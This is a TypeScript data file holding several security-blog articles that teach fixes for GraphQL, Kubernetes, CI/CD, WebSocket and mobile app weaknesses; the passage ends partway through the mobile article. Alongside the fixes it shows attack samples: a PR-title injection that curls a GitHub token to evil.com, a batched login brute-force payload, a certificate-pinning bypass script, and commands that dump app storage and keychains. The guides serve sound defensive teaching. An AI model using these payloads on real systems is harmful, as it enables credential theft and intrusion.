import { BlogPost } from "./blog-data";

export const trendingSecurityArticles: BlogPost[] = [
  {
    slug: "graphql-security-vulnerabilities-complete-guide",
    title: "GraphQL Security Vulnerabilities: The Complete Guide for 2025",
    excerpt:
      "GraphQL APIs introduce unique attack vectors — introspection leaks, batching attacks, query depth bombs, and authorization bypasses. Here's how to secure your GraphQL endpoints.",
    content: `## Why GraphQL Security Is Different

GraphQL has become the API standard for modern frontends, powering companies like GitHub, Shopify, and Airbnb. But its flexible query language creates a fundamentally different attack surface than REST APIs.

| Attack Vector | REST API | GraphQL |
|---|---|---|
| Data enumeration | Limited by endpoints | Introspection reveals entire schema |
| DoS via queries | Rate limit per endpoint | Nested queries can exponentially grow |
| Batching attacks | One operation per request | Multiple operations in single request |
| Authorization | Per-endpoint middleware | Per-field resolver logic required |
| Information disclosure | Fixed response shapes | Client controls what's returned |

> **Key insight:** The same flexibility that makes GraphQL great for developers makes it dangerous without proper security controls.

---

## Vulnerability #1: Introspection Enabled in Production

GraphQL introspection lets anyone query your entire API schema — every type, field, mutation, and relationship.

### ❌ Vulnerable Configuration

\`\`\`javascript
// Apollo Server — introspection ON by default
const server = new ApolloServer({
  typeDefs,
  resolvers,
  // No introspection setting = enabled by default!
});
\`\`\`

### What Attackers See

\`\`\`graphql
# This query dumps your entire schema
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
    mutationType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
\`\`\`

An attacker now knows every data model, relationship, mutation, and argument — a complete roadmap for exploitation.

### ✅ Fixed Configuration

\`\`\`javascript
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
  plugins: [
    ApolloServerPluginLandingPageDisabled(),
  ],
});
\`\`\`

---

## Vulnerability #2: Query Depth Attacks (GraphQL Bombs)

Nested relationships let attackers craft queries that explode exponentially.

### ❌ Vulnerable Query

\`\`\`graphql
# Each level multiplies the database load
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {  # 7 levels deep — hundreds of DB queries
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}
\`\`\`

A single request like this can trigger **thousands of database queries** (the N+1 problem, multiplied).

### ✅ Fix: Query Depth Limiting

\`\`\`javascript
import depthLimit from 'graphql-depth-limit';

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [depthLimit(5)], // Max 5 levels deep
});
\`\`\`

---

## Vulnerability #3: Query Complexity / Cost Attacks

Even shallow queries can be expensive if they request massive datasets.

### ❌ Expensive Query

\`\`\`graphql
query {
  allUsers(first: 10000) {    # 10,000 users
    orders(first: 100) {       # × 100 orders each
      items {                   # × N items each
        product {
          reviews(first: 50) {  # × 50 reviews each
            text
          }
        }
      }
    }
  }
}
\`\`\`

### ✅ Fix: Query Cost Analysis

\`\`\`javascript
import { createComplexityLimitRule } from 'graphql-validation-complexity';

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    createComplexityLimitRule(1000, {
      scalarCost: 1,
      objectCost: 10,
      listFactor: 20,
      onCost: (cost) => {
        console.log('Query cost:', cost);
      },
    }),
  ],
});
\`\`\`

---

## Vulnerability #4: Batching Attacks for Brute Force

GraphQL allows sending multiple operations in a single HTTP request — perfect for brute-forcing.

### ❌ Brute Force via Batching

\`\`\`json
[
  { "query": "mutation { login(email: \\"admin@example.com\\", password: \\"password1\\") { token } }" },
  { "query": "mutation { login(email: \\"admin@example.com\\", password: \\"password2\\") { token } }" },
  { "query": "mutation { login(email: \\"admin@example.com\\", password: \\"password3\\") { token } }" },
  // ... 1000 more attempts in a single request
]
\`\`\`

Traditional rate limiting (per request) won't catch this — it's one HTTP request with 1,000 login attempts.

### ✅ Fix: Limit Batch Size + Per-Operation Rate Limiting

\`\`\`javascript
// Limit batch size
app.use('/graphql', (req, res, next) => {
  if (Array.isArray(req.body) && req.body.length > 5) {
    return res.status(400).json({
      error: 'Batch limit exceeded. Maximum 5 operations per request.'
    });
  }
  next();
});

// Per-operation rate limiting on sensitive mutations
const rateLimitDirective = {
  login: { window: '15m', max: 5 },
  resetPassword: { window: '1h', max: 3 },
  createUser: { window: '1h', max: 10 },
};
\`\`\`

---

## Vulnerability #5: Missing Field-Level Authorization

With REST, you authorize at the endpoint level. With GraphQL, every field needs authorization.

### ❌ Vulnerable Resolver

\`\`\`javascript
const resolvers = {
  Query: {
    user: (_, { id }) => User.findById(id), // No auth check!
  },
  User: {
    email: (user) => user.email,          // Anyone can see emails
    ssn: (user) => user.ssn,              // Anyone can see SSNs!
    salary: (user) => user.salary,         // Anyone can see salaries!
    internalNotes: (user) => user.notes,   // Internal data exposed
  },
};
\`\`\`

### ✅ Fixed: Field-Level Auth

\`\`\`javascript
const resolvers = {
  Query: {
    user: (_, { id }, context) => {
      if (!context.user) throw new AuthenticationError('Login required');
      return User.findById(id);
    },
  },
  User: {
    email: (user, _, context) => {
      if (context.user.id === user.id || context.user.role === 'admin')
        return user.email;
      return null; // Mask for other users
    },
    ssn: (user, _, context) => {
      if (context.user.role !== 'admin')
        throw new ForbiddenError('Insufficient permissions');
      return user.ssn;
    },
    salary: (user, _, context) => {
      if (context.user.role !== 'hr' && context.user.id !== user.id)
        return null;
      return user.salary;
    },
  },
};
\`\`\`

---

## GraphQL Security Checklist

| Control | Tool/Library | Priority |
|---|---|---|
| Disable introspection in production | Apollo config, graphql-disable-introspection | Critical |
| Query depth limiting | graphql-depth-limit | Critical |
| Query cost analysis | graphql-validation-complexity | High |
| Batch limiting | Custom middleware | High |
| Field-level authorization | graphql-shield, custom directives | Critical |
| Persisted queries only | Apollo automatic persisted queries | High |
| Input validation | Custom scalars, joi, zod | High |
| Rate limiting per operation | graphql-rate-limit | Medium |
| Logging & monitoring | Apollo Studio, custom plugins | Medium |

---

## Free Security Review

Worried about your GraphQL API security? We review real code — **not just config files**. [Request a free 20-line code review →](/contact?subject=Free+Sample+Code+Review)

---

*Published by the SecureCodeReviews.com team — helping development teams ship secure GraphQL APIs since 2024.*
`,
    author: "SecureCodeReviews Team",
    date: "2025-01-28",
    tags: ["GraphQL", "API Security", "Authorization", "DoS Protection"],
    category: "API Security",
    readTime: "14 min read",
  },
  {
    slug: "kubernetes-security-misconfigurations-top-10",
    title: "Top 10 Kubernetes Security Misconfigurations (With Fix Commands)",
    excerpt:
      "Most Kubernetes clusters in production have at least 3 of these misconfigurations. Here are the top 10 we find during security audits — with kubectl commands to fix each one.",
    content: `## The State of Kubernetes Security

Kubernetes powers over **60% of containerized workloads** in production. Yet a 2024 Red Hat survey found that **67% of organizations delayed or slowed deployment due to security concerns**, and **46% experienced a security incident** related to containers or Kubernetes.

The root cause? **Misconfiguration, not zero-days.** The vast majority of Kubernetes security incidents stem from default configurations that are designed for convenience, not security.

---

## #1: Running Containers as Root

By default, containers run as root (UID 0). If an attacker escapes the container, they're root on the node.

### ❌ Vulnerable Pod

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: web-app
spec:
  containers:
  - name: app
    image: myapp:latest
    # No securityContext = runs as root
\`\`\`

### ✅ Fixed Pod

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: web-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
\`\`\`

### Check Command

\`\`\`bash
# Find pods running as root
kubectl get pods --all-namespaces -o json | \\
  jq '.items[] | select(.spec.containers[].securityContext.runAsNonRoot != true) | .metadata.name'
\`\`\`

---

## #2: No Network Policies (Flat Network)

By default, **every pod can talk to every other pod** in a Kubernetes cluster. If one pod is compromised, an attacker can reach databases, internal services, and the API server.

### ❌ Default: No Network Policies

\`\`\`bash
# Check for network policies
kubectl get networkpolicies --all-namespaces
# If empty, every pod can communicate with every other pod
\`\`\`

### ✅ Fixed: Default-Deny + Allow Rules

\`\`\`yaml
# Default deny all ingress/egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
# Allow only what's needed
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-api
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api-server
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: web-frontend
    ports:
    - port: 8080
\`\`\`

---

## #3: Secrets Stored in Plain Text

Kubernetes "Secrets" are just base64-encoded — **not encrypted**.

### ❌ False Sense of Security

\`\`\`bash
# "Secret" is just base64
kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d
# Output: MyPlainTextPassword123
\`\`\`

### ✅ Fix: Enable Encryption at Rest

\`\`\`yaml
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
  - secrets
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: <base64-encoded-32-byte-key>
  - identity: {}
\`\`\`

Better yet, use **external secret managers** like HashiCorp Vault, AWS Secrets Manager, or the External Secrets Operator.

---

## #4: RBAC Too Permissive (cluster-admin Everywhere)

\`\`\`bash
# Find overprivileged service accounts  
kubectl get clusterrolebindings -o json | \\
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]'
\`\`\`

If you see application service accounts bound to \`cluster-admin\`, that's a critical finding.

### ✅ Fix: Least-Privilege RBAC

\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: app-role
rules:
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list"]        # Read-only
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get"]                 # Specific configmaps only
  resourceNames: ["app-config"]  # Named resources
\`\`\`

---

## #5: No Resource Limits (Resource Bomb DoS)

Without limits, a single pod can consume all CPU/memory on a node.

### ✅ Fix: Set Limits + LimitRange

\`\`\`yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: default-limits
  namespace: production
spec:
  limits:
  - default:
      memory: "512Mi"
      cpu: "500m"
    defaultRequest:
      memory: "256Mi"
      cpu: "100m"
    type: Container
\`\`\`

---

## #6: Using Latest Tag for Images

\`\`\`yaml
# ❌ Never do this in production
image: myapp:latest

# ✅ Pin to specific digest
image: myapp@sha256:abc123def456...
\`\`\`

---

## #7: Dashboard Exposed Without Authentication

The Kubernetes Dashboard, if exposed, gives full cluster control.

\`\`\`bash
# Check if dashboard is exposed
kubectl get svc -n kubernetes-dashboard
kubectl get ingress -n kubernetes-dashboard
\`\`\`

---

## #8: API Server Publicly Accessible

\`\`\`bash
# Check API server access
kubectl cluster-info
# If the endpoint is a public IP, restrict it
\`\`\`

### ✅ Fix: Restrict API Server Access

\`\`\`bash
# EKS: Restrict to private endpoint
aws eks update-cluster-config \\
  --name my-cluster \\
  --resources-vpc-config endpointPublicAccess=false,endpointPrivateAccess=true
\`\`\`

---

## #9: No Pod Security Standards

Since PodSecurityPolicy was deprecated in 1.25, use Pod Security Admission.

### ✅ Fix: Enforce Pod Security Standards

\`\`\`yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
\`\`\`

---

## #10: No Audit Logging

Without audit logs, you won't know when someone accesses sensitive resources.

### ✅ Fix: Enable Audit Policy

\`\`\`yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse
  resources:
  - group: ""
    resources: ["secrets"]
- level: Metadata
  resources:
  - group: ""
    resources: ["pods", "services"]
\`\`\`

---

## Quick Audit Checklist

| # | Check | Severity |
|---|---|---|
| 1 | Containers running as root | Critical |
| 2 | No network policies | Critical |
| 3 | Unencrypted secrets | High |
| 4 | Overprivileged RBAC | Critical |
| 5 | No resource limits | Medium |
| 6 | Latest image tags | Medium |
| 7 | Dashboard exposed | Critical |
| 8 | Public API server | Critical |
| 9 | No pod security standards | High |
| 10 | No audit logging | High |

---

## Need a Kubernetes Security Audit?

We review Kubernetes manifests, Helm charts, and cluster configurations. [Request a free sample review →](/contact?subject=Free+Sample+Code+Review)

---

*Published by the SecureCodeReviews.com team — trusted by DevOps teams securing production Kubernetes clusters.*
`,
    author: "SecureCodeReviews Team",
    date: "2025-01-25",
    tags: ["Kubernetes", "DevSecOps", "Container Security", "Cloud Security"],
    category: "Cloud Security",
    readTime: "16 min read",
  },
  {
    slug: "cicd-pipeline-security-attacks-prevention",
    title: "CI/CD Pipeline Security: 8 Attacks We See in Every Audit",
    excerpt:
      "Your CI/CD pipeline has access to production credentials, source code, and deployment infrastructure. Here are the 8 most common attacks we find — and how to prevent each one.",
    content: `## Why CI/CD Pipelines Are High-Value Targets

Your CI/CD pipeline is arguably the **most privileged system in your organization**. It has:

- ✅ Access to source code (all repositories)
- ✅ Production deployment credentials
- ✅ Cloud provider IAM roles
- ✅ Database connection strings
- ✅ API keys and secrets
- ✅ Code signing certificates

A compromised pipeline means an attacker can **inject code into every build**, steal every secret, and deploy malicious code to production — automatically.

> **Real-world example:** The SolarWinds SUNBURST attack compromised CI/CD to inject malicious code into software updates, affecting 18,000+ organizations including U.S. government agencies.

---

## Attack #1: Secrets in Environment Variables (Plain Text)

### ❌ Vulnerable Pipeline

\`\`\`yaml
# .github/workflows/deploy.yml
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE    # Hardcoded!
      AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI...     # In plain text!
      DATABASE_URL: postgresql://admin:password@prod-db:5432/app
    steps:
      - run: ./deploy.sh
\`\`\`

Anyone with repo read access sees these credentials. Fork PRs can exfiltrate them.

### ✅ Fix: Use Secrets Manager

\`\`\`yaml
# .github/workflows/deploy.yml
name: Deploy
on:
  push:
    branches: [main]  # Only on main, not PRs
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Requires approval
    permissions:
      id-token: write        # OIDC, no static keys
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::role/deploy
          aws-region: us-east-1
      - run: ./deploy.sh
\`\`\`

---

## Attack #2: Poisoned Pull Request (PR)

An attacker forks your repo, modifies the CI config, and opens a PR that runs their code in your pipeline.

### ❌ Vulnerable Workflow

\`\`\`yaml
on:
  pull_request:     # Runs on ALL PR types
    types: [opened, synchronize]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test  # Attacker modifies package.json scripts
\`\`\`

### ✅ Fix: Require Approval for External PRs

\`\`\`yaml
on:
  pull_request_target:   # Runs in context of base, not fork
    types: [opened, synchronize]
jobs:
  test:
    runs-on: ubuntu-latest
    # Only run if author is a collaborator
    if: github.event.pull_request.author_association == 'COLLABORATOR' ||
        github.event.pull_request.author_association == 'MEMBER'
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
\`\`\`

---

## Attack #3: Dependency Confusion / Typosquatting

\`\`\`bash
# Attacker publishes a malicious package with your internal package name
npm publish @yourcompany/internal-utils  # Public npm
# Your CI pipeline installs from public npm instead of private registry
\`\`\`

### ✅ Fix: Pin Registries + Lock Files

\`\`\`ini
# .npmrc
@yourcompany:registry=https://npm.pkg.github.com/
//npm.pkg.github.com/:_authToken=\${NPM_TOKEN}
\`\`\`

\`\`\`yaml
# CI step: verify lock file integrity
- name: Verify dependencies
  run: |
    npm ci --ignore-scripts  # Install from lock file only
    npm audit --audit-level=high
\`\`\`

---

## Attack #4: Compromised GitHub Actions / Third-Party Steps

\`\`\`yaml
# ❌ Using mutable tag — author can push malicious update
- uses: some-user/cool-action@main

# ✅ Pin to specific commit SHA
- uses: some-user/cool-action@a1b2c3d4e5f6
\`\`\`

### Check Your Actions

\`\`\`bash
# Find all unpinned actions in your workflows
grep -r "uses:" .github/workflows/ | grep -v "@[a-f0-9]\\{40\\}" | grep -v "@v[0-9]"
\`\`\`

---

## Attack #5: Build Output Tampering

If build artifacts aren't signed or verified, an attacker with CI access can swap the artifact.

### ✅ Fix: Sign and Verify Artifacts

\`\`\`yaml
# Sign container images with cosign
- name: Sign image
  run: |
    cosign sign --key cosign.key \\
      \${{ env.REGISTRY }}/\${{ env.IMAGE }}@\${{ steps.build.outputs.digest }}

# Verify in deployment
- name: Verify image
  run: |
    cosign verify --key cosign.pub \\
      \${{ env.REGISTRY }}/\${{ env.IMAGE }}@\${{ env.DIGEST }}
\`\`\`

---

## Attack #6: Self-Hosted Runner Escape

Self-hosted runners share the host OS. One malicious job can access artifacts from other jobs.

### ✅ Fix: Ephemeral Runners

\`\`\`yaml
# Use ephemeral runners that are destroyed after each job
runs-on: [self-hosted, ephemeral]

# Or better: use GitHub-hosted runners for public repos
runs-on: ubuntu-latest
\`\`\`

---

## Attack #7: Workflow Injection via Untrusted Input

\`\`\`yaml
# ❌ PR title injected into shell command
- name: Check PR
  run: echo "PR title: \${{ github.event.pull_request.title }}"
# Attacker sets PR title to: "; curl http://evil.com/steal?token=$GITHUB_TOKEN"

# ✅ Fix: Use environment variable
- name: Check PR
  env:
    PR_TITLE: \${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
\`\`\`

---

## Attack #8: OIDC Token Scope Too Broad

\`\`\`yaml
# ❌ Any branch can assume production role
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::role/admin  # Too much access!

# ✅ Fix: Restrict role trust policy
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
    }
  }
}
\`\`\`

---

## CI/CD Security Checklist

| Control | Priority | Tool |
|---|---|---|
| No hardcoded secrets | Critical | GitLeaks, TruffleHog |
| Pin action versions to SHA | High | Renovate, Dependabot |
| Restrict PR workflow triggers | Critical | GitHub settings |
| Use OIDC instead of static keys | High | AWS/GCP/Azure OIDC |
| Sign build artifacts | High | Cosign, Sigstore |
| Ephemeral/isolated runners | Medium | GitHub-hosted, Firecracker |
| Dependency verification | High | npm audit, pip-audit |
| Audit logging for pipeline | Medium | GitHub audit log API |

---

## Need a CI/CD Security Review?

We audit GitHub Actions, GitLab CI, Jenkins, and Azure DevOps pipelines. [Request a free review →](/contact?subject=Free+Sample+Code+Review)

---

*Published by the SecureCodeReviews.com team — helping teams secure their software supply chains.*
`,
    author: "SecureCodeReviews Team",
    date: "2025-01-22",
    tags: ["CI/CD", "DevSecOps", "Supply Chain Security", "GitHub Actions"],
    category: "DevSecOps",
    readTime: "15 min read",
  },
  {
    slug: "websocket-security-vulnerabilities-guide",
    title: "WebSocket Security: 6 Vulnerabilities Developers Always Miss",
    excerpt:
      "WebSockets bypass traditional HTTP security controls. Here are the 6 most common vulnerabilities we find in WebSocket implementations — from CSWSH to message injection.",
    content: `## Why WebSocket Security Gets Overlooked

WebSockets provide real-time, bidirectional communication — powering chat apps, live dashboards, collaborative editors, and trading platforms. But they **bypass most traditional HTTP security controls**:

- ❌ No CORS protection (WebSockets don't follow same-origin policy the same way)
- ❌ No built-in authentication per message
- ❌ No automatic CSRF protection
- ❌ WAFs often can't inspect WebSocket traffic
- ❌ Rate limiting is harder to implement

> **In our security audits, 90% of WebSocket implementations had at least one critical vulnerability.**

---

## Vulnerability #1: Cross-Site WebSocket Hijacking (CSWSH)

This is the WebSocket equivalent of CSRF — and it's **critical**.

### How It Works

1. User is logged into \`app.example.com\` (has session cookie)
2. User visits \`evil.com\`
3. \`evil.com\` opens a WebSocket to \`app.example.com/ws\`
4. Browser sends the session cookie automatically
5. Attacker's page now has an authenticated WebSocket connection

### ❌ Vulnerable Server

\`\`\`javascript
const WebSocket = require('ws');
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  // No origin check!
  // Cookie is sent automatically — attacker has authenticated connection
  const session = getSessionFromCookie(req.headers.cookie);
  ws.userId = session.userId;
});
\`\`\`

### ✅ Fixed Server

\`\`\`javascript
wss.on('connection', (ws, req) => {
  // Check Origin header
  const origin = req.headers.origin;
  const allowedOrigins = ['https://app.example.com'];

  if (!allowedOrigins.includes(origin)) {
    ws.close(1008, 'Origin not allowed');
    return;
  }

  // Better: Use ticket-based auth instead of cookies
  const ticket = new URL(req.url, 'http://localhost').searchParams.get('ticket');
  const session = validateOneTimeTicket(ticket);

  if (!session) {
    ws.close(1008, 'Invalid ticket');
    return;
  }

  ws.userId = session.userId;
});
\`\`\`

---

## Vulnerability #2: No Authentication After Handshake

The initial WebSocket handshake might be authenticated, but **subsequent messages aren't verified**.

### ❌ Vulnerable Pattern

\`\`\`javascript
wss.on('connection', (ws, req) => {
  const user = authenticateRequest(req); // Auth only at connection time

  ws.on('message', (data) => {
    const msg = JSON.parse(data);
    // No re-verification — what if session expired?
    // What if user's permissions changed?
    handleMessage(ws, msg);
  });
});
\`\`\`

### ✅ Fix: Per-Message Token Validation

\`\`\`javascript
wss.on('connection', (ws, req) => {
  let currentUser = authenticateRequest(req);

  ws.on('message', async (data) => {
    const msg = JSON.parse(data);

    // Periodically revalidate (every 5 minutes)
    if (Date.now() - ws.lastAuthCheck > 300000) {
      currentUser = await revalidateSession(ws.sessionId);
      if (!currentUser) {
        ws.close(1008, 'Session expired');
        return;
      }
      ws.lastAuthCheck = Date.now();
    }

    // Check permissions for this specific action
    if (!currentUser.can(msg.action)) {
      ws.send(JSON.stringify({ error: 'Forbidden' }));
      return;
    }

    handleMessage(ws, currentUser, msg);
  });
});
\`\`\`

---

## Vulnerability #3: No Input Validation on Messages

### ❌ Dangerous: Trusting Client Messages

\`\`\`javascript
ws.on('message', (data) => {
  const msg = JSON.parse(data);

  switch (msg.action) {
    case 'updateProfile':
      // Directly using client-supplied userId — IDOR!
      db.users.update(msg.userId, { name: msg.name });
      break;
    case 'sendMessage':
      // No sanitization — stored XSS when displayed!
      db.messages.insert({
        text: msg.text,
        room: msg.room,
      });
      break;
  }
});
\`\`\`

### ✅ Fix: Validate and Sanitize Everything

\`\`\`javascript
import { z } from 'zod';
import DOMPurify from 'isomorphic-dompurify';

const messageSchemas = {
  updateProfile: z.object({
    action: z.literal('updateProfile'),
    name: z.string().min(1).max(100).regex(/^[a-zA-Z\\s]+$/),
  }),
  sendMessage: z.object({
    action: z.literal('sendMessage'),
    text: z.string().min(1).max(5000),
    room: z.string().uuid(),
  }),
};

ws.on('message', (data) => {
  let msg;
  try {
    msg = JSON.parse(data);
  } catch {
    ws.send(JSON.stringify({ error: 'Invalid JSON' }));
    return;
  }

  const schema = messageSchemas[msg.action];
  if (!schema) {
    ws.send(JSON.stringify({ error: 'Unknown action' }));
    return;
  }

  const result = schema.safeParse(msg);
  if (!result.success) {
    ws.send(JSON.stringify({ error: result.error.message }));
    return;
  }

  // Use server-side userId, sanitize text
  if (msg.action === 'sendMessage') {
    msg.text = DOMPurify.sanitize(msg.text);
  }

  handleMessage(ws, ws.userId, result.data); // Use ws.userId, not msg.userId
});
\`\`\`

---

## Vulnerability #4: No Rate Limiting

WebSockets maintain a persistent connection, so an attacker can **flood messages** without opening new connections.

### ✅ Fix: Message Rate Limiting

\`\`\`javascript
const rateLimiter = new Map();

ws.on('message', (data) => {
  const now = Date.now();
  const userLimits = rateLimiter.get(ws.userId) || { count: 0, windowStart: now };

  if (now - userLimits.windowStart > 60000) {
    // Reset window
    userLimits.count = 0;
    userLimits.windowStart = now;
  }

  userLimits.count++;
  rateLimiter.set(ws.userId, userLimits);

  if (userLimits.count > 100) {  // Max 100 messages per minute
    ws.send(JSON.stringify({ error: 'Rate limit exceeded' }));
    return;
  }

  handleMessage(ws, data);
});
\`\`\`

---

## Vulnerability #5: Leaking Data via Broadcast

### ❌ Broadcasting Sensitive Data to All Clients

\`\`\`javascript
// When an order is updated, broadcast to all connected clients
function notifyOrderUpdate(order) {
  wss.clients.forEach((client) => {
    // Every connected user sees every order!
    client.send(JSON.stringify({
      type: 'orderUpdate',
      order: order,  // Includes other users' data
    }));
  });
}
\`\`\`

### ✅ Fix: Room-Based + Permission-Filtered Broadcasting

\`\`\`javascript
function notifyOrderUpdate(order) {
  wss.clients.forEach((client) => {
    // Only send to the order owner or admin
    if (client.userId === order.userId || client.role === 'admin') {
      // Filter sensitive fields based on role
      const filtered = client.role === 'admin'
        ? order
        : { id: order.id, status: order.status, total: order.total };

      client.send(JSON.stringify({
        type: 'orderUpdate',
        order: filtered,
      }));
    }
  });
}
\`\`\`

---

## Vulnerability #6: No TLS (wss://)

\`\`\`javascript
// ❌ Unencrypted — anyone on the network can read/modify messages
const ws = new WebSocket('ws://api.example.com/ws');

// ✅ Always use TLS
const ws = new WebSocket('wss://api.example.com/ws');
\`\`\`

---

## WebSocket Security Checklist

| Control | Priority |
|---|---|
| Origin validation (CSWSH prevention) | Critical |
| Ticket-based auth (not cookie-based) | Critical |
| Per-message input validation (Zod/Joi) | Critical |
| Periodic session revalidation | High |
| Message rate limiting | High |
| Room-based authorization for broadcasts | High |
| TLS (wss://) everywhere | Critical |
| Message size limits | Medium |
| Connection timeout/heartbeat | Medium |

---

## Need a WebSocket Security Review?

We audit WebSocket implementations, Socket.IO servers, and real-time APIs. [Request a free sample review →](/contact?subject=Free+Sample+Code+Review)

---

*Published by the SecureCodeReviews.com team — securing real-time applications for production.*
`,
    author: "SecureCodeReviews Team",
    date: "2025-01-20",
    tags: ["WebSocket", "Real-Time Security", "Node.js", "CSWSH"],
    category: "Web Security",
    readTime: "13 min read",
  },
  {
    slug: "mobile-app-security-testing-guide-2025",
    title: "Mobile App Security Testing: A Practical Guide for 2025",
    excerpt:
      "From insecure data storage to broken certificate pinning — here's how to test your mobile app for the OWASP Mobile Top 10 vulnerabilities with free tools.",
    content: `## Why Mobile App Security Matters More Than Ever

Mobile apps handle sensitive data — banking, healthcare, authentication, personal communications. Yet **80% of mobile apps** we audit have at least one critical vulnerability.

The OWASP Mobile Top 10 (2024) lists the most critical mobile security risks:

| # | Risk | Prevalence |
|---|---|---|
| M1 | Improper Credential Usage | Very Common |
| M2 | Inadequate Supply Chain Security | Common |
| M3 | Insecure Authentication/Authorization | Very Common |
| M4 | Insufficient Input/Output Validation | Common |
| M5 | Insecure Communication | Common |
| M6 | Inadequate Privacy Controls | Common |
| M7 | Insufficient Binary Protections | Very Common |
| M8 | Security Misconfiguration | Very Common |
| M9 | Insecure Data Storage | Very Common |
| M10 | Insufficient Cryptography | Common |

---

## Testing Area #1: Insecure Data Storage

Mobile apps frequently store sensitive data in insecure locations.

### What to Check (Android)

\`\`\`bash
# Check SharedPreferences for sensitive data
adb shell cat /data/data/com.example.app/shared_prefs/*.xml

# Check SQLite databases
adb shell sqlite3 /data/data/com.example.app/databases/app.db ".dump"

# Check for sensitive data in logs
adb logcat | grep -i "password\\|token\\|api_key\\|secret"

# Check external storage (world-readable!)
adb shell ls /sdcard/Android/data/com.example.app/
\`\`\`

### What to Check (iOS)

\`\`\`bash
# Check Keychain (using objection)
objection -g com.example.app explore
> ios keychain dump

# Check NSUserDefaults (plist files)
> ios plist cat NSUserDefaults

# Check for sensitive data in Core Data / SQLite
> sqlite connect Library/Application\\ Support/app.sqlite
\`\`\`

### ❌ Vulnerable (Android — Storing token in SharedPreferences)

\`\`\`kotlin
// INSECURE — SharedPreferences is stored in plain XML
val prefs = getSharedPreferences("auth", MODE_PRIVATE)
prefs.edit().putString("access_token", token).apply()
prefs.edit().putString("refresh_token", refreshToken).apply()
\`\`\`

### ✅ Fixed (Android — Using EncryptedSharedPreferences)

\`\`\`kotlin
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()

val securePrefs = EncryptedSharedPreferences.create(
    context,
    "secure_auth",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)

securePrefs.edit().putString("access_token", token).apply()
\`\`\`

---

## Testing Area #2: Certificate Pinning Bypass

If your app doesn't pin certificates, attackers on the same network can intercept HTTPS traffic.

### Test with Frida

\`\`\`javascript
// frida-ssl-pin-bypass.js
Java.perform(function () {
  var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  var SSLContext = Java.use('javax.net.ssl.SSLContext');

  // This script bypasses certificate pinning
  // If it works, your app is vulnerable
  var TrustAllManager = Java.registerClass({
    name: 'com.frida.TrustAllManager',
    implements: [TrustManager],
    methods: {
      checkClientTrusted: function (chain, authType) {},
      checkServerTrusted: function (chain, authType) {},
      getAcceptedIssuers: function () { return []; },
    },
  });
});
\`\`\`

### ✅ Fix: Implement Certificate Pinning

\`\`\`kotlin
// Android — OkHttp Certificate Pinning
val client = OkHttpClient.Builder()
    .certificatePinner(
        CertificatePinner.Builder()
            .add("api.example.com",
                "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=") // Primary
            .add("api.example.com",
                "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=") // Backup
            .build()
    )
    .build()
\`\`\`

---

## Testing Area #3: Reverse Engineering & Hardcoded Secrets

### Android APK Analysis

\`\`\`bash
# Decompile APK
apktool d app.apk -o app_decompiled

# Search for hardcoded secrets
grep -r "api_key\\|secret\\|password\\|token" app_decompiled/
grep -r "https://\\|http://" app_decompiled/smali/

# Use jadx for Java source
jadx -d output app.apk
grep -r "API_KEY\\|SECRET" output/
\`\`\`

